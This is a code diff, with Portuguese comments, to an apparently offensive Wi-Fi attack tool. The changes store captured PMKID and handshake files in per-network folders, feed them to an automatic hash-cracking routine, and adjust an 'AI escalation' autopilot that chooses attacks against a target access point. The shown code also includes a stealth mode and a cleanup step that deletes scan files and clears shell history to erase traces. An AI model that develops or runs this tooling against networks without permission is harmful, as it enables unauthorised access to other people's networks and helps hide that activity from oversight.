@@ -25,6 +25,22 @@ except ImportError:
 console = Console()
 WEB_CALLBACK = None
 AUTOPILOT_ACTIVE = False
+BASE_CAP_DIR = "capturas_dsi"
+
+def setup_capture_dir(essid):
+    """ Cria o diretório base e a subpasta com o nome da rede (limpo) """
+    if not os.path.exists(BASE_CAP_DIR):
+        os.makedirs(BASE_CAP_DIR)
+        
+    # Limpa o ESSID de caracteres perigosos para nome de pasta
+    safe_essid = re.sub(r'[^a-zA-Z0-9_\-]', '_', essid)
+    if not safe_essid: safe_essid = "RedeOculta"
+    
+    target_dir = os.path.join(BASE_CAP_DIR, safe_essid)
+    if not os.path.exists(target_dir):
+        os.makedirs(target_dir)
+        
+    return target_dir, safe_essid
 
 def supreme_log(msg, log_type="info"):
     if WEB_CALLBACK: WEB_CALLBACK(msg, log_type)
@@ -327,14 +343,14 @@ class DSIOrchestrator:
             self.success_event.set()
 
     def launch_concurrent_assault(self):
-        prefix = f"elite_{self.target['essid']}"
+        prefix = f"elite"
         apply_stealth_mode(self.interface)
         
         supreme_log(f"LANÇANDO ATAQUE MULTI-VETOR EM {self.target['essid']}...", log_type="cmd")
         
         # Inicia Captura Passiva e Ativa simultaneamente
-        v1 = threading.Thread(target=self._run_vector, args=(capture_pmkid, self.interface, self.target['bssid'], self.target['channel'], prefix))
-        v2 = threading.Thread(target=self._run_vector, args=(capture_vetor_x, self.interface, self.target['bssid'], self.target['channel'], prefix))
+        v1 = threading.Thread(target=self._run_vector, args=(capture_pmkid, self.interface, self.target['bssid'], self.target['channel'], prefix, None, self.target['essid']))
+        v2 = threading.Thread(target=self._run_vector, args=(capture_vetor_x, self.interface, self.target['bssid'], self.target['channel'], prefix, self.target['essid']))
         
         self.threads = [v1, v2]
         for t in self.threads: t.start()
@@ -352,7 +368,7 @@ class DSIOrchestrator:
 def run_autopilot(interface, target):
     global AUTOPILOT_ACTIVE
     from dsi_ai import DSIAI
-    brain = DSIAI(); AUTOPILOT_ACTIVE = True; prefix = f"capture_{target['essid']}"; hw_ok = os.path.exists("/tmp/dsi_injection_ok")
+    brain = DSIAI(); AUTOPILOT_ACTIVE = True; prefix = f"capture"; hw_ok = os.path.exists("/tmp/dsi_injection_ok")
     
     orchestrator = DSIOrchestrator(interface, target)
     
@@ -368,10 +384,10 @@ def run_autopilot(interface, target):
         supreme_log(f"IA ESCALATION: {atk.upper()}")
         
         cap = None
-        if atk == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, par)
-        elif atk == 'pmkid_v6': cap = capture_pmkid_v6(interface, target['bssid'], target['channel'], prefix)
-        elif atk == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, par)
-        elif atk == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix)
+        if atk == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, par, target['essid'])
+        elif atk == 'pmkid_v6': cap = capture_pmkid_v6(interface, target['bssid'], target['channel'], prefix, target['essid'])
+        elif atk == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, par, target['essid'])
+        elif atk == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix, target['essid'])
         elif atk == 'wps':
             if capture_wps(interface, target['bssid'], target['channel'], par): 
                 brain.learn(target['bssid'], target['essid'], 'wps', True); return "WPS_SUCCESS"
@@ -547,10 +563,26 @@ def crack_hash_v7_expert(hash_file, bssid=None):
     return None
 def scan_and_crack_all():
     """ Inteligência Nato: Varre o workspace e tenta quebrar TUDO o que encontrar """
-    supreme_log("MAGISTRADO: Iniciando varredura profunda de arquivos locais...", log_type="cmd")
-    files = os.listdir(".")
-    caps = [f for f in files if f.endswith(".cap")]
-    hashes = [f for f in files if f.endswith(".16800")]
+    supreme_log(f"MAGISTRADO: Iniciando varredura profunda na pasta {BASE_CAP_DIR}...", log_type="cmd")
+    
+    if not os.path.exists(BASE_CAP_DIR):
+        supreme_log("Nenhum diretório de capturas encontrado.", log_type="error")
+        return
+
+    caps = []
+    hashes = []
+    
+    # Varre recursivamente a pasta de capturas
+    for root, _, files in os.walk(BASE_CAP_DIR):
+        for f in files:
+            full_path = os.path.join(root, f)
+            if f.endswith(".cap"): caps.append(full_path)
+            elif f.endswith(".16800"): hashes.append(full_path)
+            
+    # Também checa na raiz caso haja capturas antigas
+    for f in os.listdir("."):
+        if f.endswith(".cap"): caps.append(f)
+        elif f.endswith(".16800"): hashes.append(f)
     
     total = len(caps) + len(hashes)
     if total == 0:
@@ -566,10 +598,15 @@ def scan_and_crack_all():
 def crack_hash(hash_file, wordlist_file, bssid=None):
     crack_hash_v7_expert(hash_file, bssid)
 
-def capture_pmkid_v6(monitor_interface, bssid, channel, output_file):
+def capture_pmkid_v6(monitor_interface, bssid, channel, output_file, essid="Desconhecido"):
     supreme_log(f"Iniciando Captura PMKID Otimizada para Wi-Fi 6 em {bssid}...", log_type="cmd")
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
-    pcapng = f"{output_file}_ax.pcapng"; hashf = f"{output_file}_ax.16800"
+    
+    target_dir, safe_essid = setup_capture_dir(essid)
+    base_name = os.path.join(target_dir, f"{output_file}_{safe_essid}")
+    
+    pcapng = f"{base_name}_ax.pcapng"; hashf = f"{base_name}_ax.16800"
+    
     # hcxdumptool v6+ usa comandos diferentes
     cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=15 --active_beacon"
     try:
@@ -586,10 +623,10 @@ def capture_pmkid_v6(monitor_interface, bssid, channel, output_file):
 
 def auto_cleanup():
     """ Protocolo de Limpeza Expert: Remoção de rastros e logs temporários """
-    supreme_log("AUTO-CLEANUP: Higienizando sistema e removendo pegadas...", log_type="cmd")
+    supreme_log("AUTO-CLEANUP: Higienizando sistema e removendo pegadas (arquivos de scan)...", log_type="cmd")
     
-    # 1. Remove arquivos de scan temporários
-    run_command("rm -f web_scan_results-01.* scan_results-01.* capture_* elite_*", sudo=True)
+    # 1. Remove APENAS arquivos de scan temporários, preservando a pasta 'capturas_dsi'
+    run_command("rm -f web_scan_results-01.* scan_results-01.*", sudo=True)
     
     # 2. Limpa histórico do Bash (apenas comandos desta ferramenta)
     run_command("history -c", sudo=True)
